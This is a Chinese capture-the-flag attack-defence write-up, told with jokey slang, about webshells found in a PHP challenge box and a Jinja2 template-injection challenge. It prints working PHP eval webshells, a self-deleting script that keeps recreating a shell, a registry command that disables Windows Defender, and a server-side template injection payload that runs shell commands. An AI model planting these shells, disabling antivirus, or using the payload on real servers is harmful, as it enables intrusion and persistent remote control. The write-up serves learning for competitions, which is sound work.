# 1.\<?php @eval($_POST['cmd']);?>
👴上来就把源码下下来了┗|｀O′|┛ 嗷~~ 很快啊

先用D盾扫一遍
发现如下几个🐎
```
/www/html/public/important.php
<?php @eval($_POST['cmd']);?>
```
这个🐎win10直接给杀了
不愧是他~~个nt~~
直接蚁剑连就彳亍
👴自己的网站要第一时间删除
```
/www/html/public/.undead.php
<?php
set_time_limit(0); 
ignore_user_abort(1);
unlink(__FILE__);
while(1)
{    
    file_put_contents('shell.php','<?php @eval($_POST["password"]);?>');  
    sleep(0);
}
```
这个🐎win10也给杀了就离谱
放一个关win10安全中心的命令
```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f
```
这是一个生成不死🐎的php脚本
第一时间删了就彳亍了
用如下命令直接运行
```
php ./.undead.php
```
~~但👴队当时不会用~~
顺便把info.php删了
~~但👴队当时也不会用~~
[相关漏洞](https://blog.csdn.net/u012206617/article/details/109003244?ops_request_misc=&request_id=&biz_id=102&utm_term=phpinfo%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%25A9%25E7%2594%25A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-109003244.first_rank_v2_pc_rank_v29)

👴队当时(包括现在)都不会传🐎
白名单直接把/php类/.htaccess扬了
图片🐎传上去也连不了
⑧彳亍
那么，问题来了，为啥不直接把/public扬了？反正也不影响核心功能

###### 总结
手速很重要，找到一句话🐎🐎上删除然后就能打全场
被打就扫D盾，总能扫到一起奇奇怪怪的东西~~比如在根目录藏🐎<?php @eval($_POST['sinon']);?>~~
记得帮别人修🐎，防止其他队反复利用


# 2.模板注入

看👴的源码，有app文件夹，里面是python文件，然后看到“render_template_string”，是模板注入。

然后乱注，⑧彳亍。

学长提醒要触发error才行，直接ip/error/,乱注，⑧彳亍。

学长又提醒，前段有逻辑漏洞，把require删了，能触发error，{{7*7}}，彳亍。

找重载过的类，0试到100多⑧彳亍。搜file,warning.catch...发现有”warnings.catch_warnings“，实验手册有现成循环语句
1 
```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='catch_warnings' %}
{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls ').read()")}}{% endif %}
{% endfor %}
```
把'ls'改成'cat flag'找到了原题的flag交了⑧彳亍

学长双提醒改成’cat /flag'，彳亍。
###### 总结
学长，🐂
